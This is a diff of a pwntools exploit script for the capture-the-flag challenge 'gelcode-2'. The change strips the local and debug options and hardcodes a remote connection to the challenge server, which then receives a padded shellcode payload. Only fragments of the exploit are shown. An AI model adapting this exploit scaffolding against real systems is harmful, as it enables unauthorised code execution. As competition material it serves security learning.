@@ -71,11 +71,9 @@ with our team "Sentry Up Before You Nops Nops" --> french super team...cream of 
 from pwn import *
 
 context.update(arch="amd64", os="linux")
-context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
 context.log_level = 'info'
 
 exe = ELF('./gelcode-2')
-
 host, port = "mc.ax", "31034"
 
 # from a src eax, calculate increment of each byte to read dest eax, and emit correct opcodes for it
@@ -157,29 +155,9 @@ print('shellcode length: '+str(len(shellcode)))
 length = len(shellcode)
 
 
-if args.REMOTE:
-  p = remote(host,port)
-  p.recvuntil('is ', drop=True)
-  temp = int(p.recvuntil(' ', drop=True),10)
-  print('actual max length: '+str(temp))
-  if (temp<length):
-    print('shellcode is still too big...wait a bit...')
-    p.close()
-    sys.exit()
-  else:
-    length = temp
-else:
-  if args.GDB:
-    p = gdb.debug([exe.path, str(length)], gdbscript = '''
-    source ~/gdb.plugins/gef/gef.py
-    b main
-    c
-    pie breakpoint *0x16a1
-    c
-    stepi 17
-     ''')
-  else:
-    p = process([exe.path, str(length)])
+p = remote(host,port)
+p.recvuntil('is ', drop=True)
+length = 362
 
 payload = bytearray(shellcode.ljust(length,b'\x00'))
 
